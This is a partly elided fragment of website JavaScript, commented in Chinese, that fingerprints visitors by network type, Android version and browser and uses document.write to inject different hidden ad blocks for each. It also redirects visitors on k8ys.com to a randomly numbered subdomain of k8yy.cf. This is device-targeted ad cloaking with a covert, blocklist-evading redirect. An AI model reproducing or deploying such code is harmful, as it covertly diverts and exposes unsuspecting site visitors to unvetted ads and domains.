...
var _c_top_005=["<script type='text/javascript'>if(/wifi|wi-fi|wlan|w-lan/i.test(mtype)){document.write(_c_top_014+_c_top_011+_c_top_006+_c_top_016);}else if(/cellular|4g|3g|2g/i.test(mtype)){document.write(_c_top_007);}else{document.write(_c_top_007);}</script>"];
/* JS隐藏AD代码006 */
...
/* JS判断手机系统端代码 */
var _c_top_008=["<script type='text/javascript'>if(/Android|web1970/i.test(navigator.userAgent)){document.write(_c_top_009);}else{document.write(_c_top_014+_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* JS判断安卓端版本号代码 */
Androidversion = navigator.userAgent.match(/Android (\d+)\.(\d+)\.?(\d+)?/);
var _c_top_009=["<script type='text/javascript'>if(/8.1.0|Android 8.1.0/i.test(Androidversion)){document.write(_c_top_010);}else{document.write(_c_top_014+_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* JS判断浏览器类型代码 */
var browser = {
    versions : function () {
...
var _c_top_010=["<script type='text/javascript'>if(browser.versions.ucweb){document.write(_c_top_017);}else{document.write(_c_top_014+_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* 广告代码011 */
...
/* JS指定域名加载代码 */
/* 三位随机数 */
var ymnum = '';for(var i=0;i<3;i++){ymnum+=Math.floor(Math.random()*10);}
var _c_top_014=["<script type='text/javascript'>if(location.href.indexOf('k8ys.com') > -1) {location.href='http://'+ymnum+'.k8yy.cf'+location.pathname;}</script>"];
/* 临时总统计1 */
